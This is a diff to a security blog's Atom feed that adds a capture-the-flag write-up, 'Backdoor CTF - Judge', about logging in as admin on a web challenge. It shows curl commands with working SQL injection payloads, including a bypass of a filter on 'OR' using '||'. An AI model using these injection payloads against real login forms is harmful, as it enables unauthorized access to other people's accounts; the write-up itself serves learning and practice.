@@ -4,7 +4,7 @@
   <title><![CDATA[Category: Web | staring into /dev/null]]></title>
   <link href="http://barrebas.github.io/blog/categories/web/atom.xml" rel="self"/>
   <link href="http://barrebas.github.io/"/>
-  <updated>2015-03-31T07:19:17+02:00</updated>
+  <updated>2015-04-02T20:17:02+02:00</updated>
   <id>http://barrebas.github.io/</id>
   <author>
     <name><![CDATA[barrebas]]></name>
@@ -12,6 +12,52 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[Backdoor CTF - Judge]]></title>
+    <link href="http://barrebas.github.io/blog/2015/04/02/backdoor-ctf-judge/"/>
+    <updated>2015-04-02T20:10:52+02:00</updated>
+    <id>http://barrebas.github.io/blog/2015/04/02/backdoor-ctf-judge</id>
+    <content type="html"><![CDATA[<p>A web challenge! For 100 points, we we&rsquo;re asked to log in as <code>admin</code>.</p>
+
+<!-- more -->
+
+
+<p>Pointing a browser to the challenge site gave us the option to login, or register. I decided to register <code>testz0r:testz0r</code> and logged in. The login then asked me to login as admin. Well, I had no password for admin. I went back to the register page, thinking there was a SQLi there. That might allow me to inject into the INSERT INTO statement and update the admin&rsquo;s password. Alas, no dice.</p>
+
+<p>I again fired up <code>curl</code> and tried to get some SQLi going on the login form.</p>
+
+<pre><code class="bash">curl http://hack.bckdr.in/JUDGE/index.php --data "username=testz0r' or 'a'='a&amp;password=testz0r"
+&lt;!DOCTYPE html&gt;
+
+&lt;html&gt;
+
+&lt;head&gt;
+&lt;title&gt;Login&lt;/title&gt;
+&lt;/head&gt;
+
+&lt;body&gt;
+An Error occured
+</code></pre>
+
+<p>After messing around for a while, I remembered that sometimes, keywords like <code>OR</code> and <code>AND</code> are filtered. I tried to substitute <code>OR</code> for <code>||</code> and whadda-ya-know:</p>
+
+<pre><code class="bash">$ curl http://hack.bckdr.in/JUDGE/index.php --data "username=admin'||'1&amp;password=testz0r"
+&lt;!DOCTYPE html&gt;
+
+&lt;html&gt;
+
+&lt;head&gt;
+&lt;title&gt;Login&lt;/title&gt;
+&lt;/head&gt;
+
+&lt;body&gt;
+Flag is [REDACTED]
+</code></pre>
+
+<p>Done! One filter bypass was all it took.</p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[ASIS-CTF: Lottery]]></title>
